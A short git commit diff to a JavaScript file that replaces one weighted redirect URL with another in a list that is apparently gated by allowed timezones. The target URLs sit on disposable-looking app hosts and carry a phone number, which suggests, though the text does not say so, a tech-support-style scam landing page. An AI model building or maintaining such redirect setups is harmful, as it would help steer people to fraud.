59101320e0e489641dfbec991583632539122533
paalakash <palaksh452@gmail.com>
2026-07-14 09:47:59 +0530

    Update index.js

--- index.js
+++ index.js
@@ -34,7 +34,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://octopus-app-n6k89.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 1.0 }
+    { url: "https://hammerhead-app-egihj.ondigitalocean.app/werrx01USAHTML/?bcda=1800-549-821", weight: 1.0 }
     
 ];
 
